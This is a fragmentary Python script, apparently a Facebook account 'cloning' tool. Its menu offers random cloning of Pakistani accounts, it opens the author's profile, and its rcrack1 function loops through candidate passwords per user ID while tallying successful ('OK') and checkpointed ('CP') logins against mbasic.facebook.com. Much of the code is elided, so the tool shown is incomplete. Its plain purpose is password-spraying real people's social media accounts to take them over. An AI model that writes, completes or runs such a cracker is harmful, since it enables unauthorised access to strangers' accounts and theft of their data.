...
class Main:
    def __init__(self):
        ...
        print(" [3] ꜰᴀᴄᴇʙᴏᴏᴋ ʀᴀɴᴅᴏᴍ ᴄʟᴏɴɪɴɢ [\033[1;35mPAKISTAN]")
        print(" [0] Exit")
...
def v1():
    user=[]
    os.system('clear')
    os.system('xdg-open https://www.facebook.com/profile.php?id=100073781031664')
    print(logo)
...
def rcrack1(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write('\r[\033[1;92mSaadi X Shamu\033[1;97m] [%s/%s] [\033[1;92mOK\033[1;97m:-\033[1;92m%s\033[1;97m] [\033[1;91mCP\033[1;97m:-\033[1;91m%s\033[1;97m] \r'%(loop,tl,len(oks),len(cps))),
            sys.stdout.flush()
    ...
    'referer': 'https://mbasic.facebook.com/messages/?entrypoint=jewel&eav=Afbon6FZ1KqCdqVuPnUs4k7zkI6JzPI6i2T783-B50oSBS7m4gxyXCorz62Z2jmHJmY&paipv=0&no_hist=1&ref=wizard',
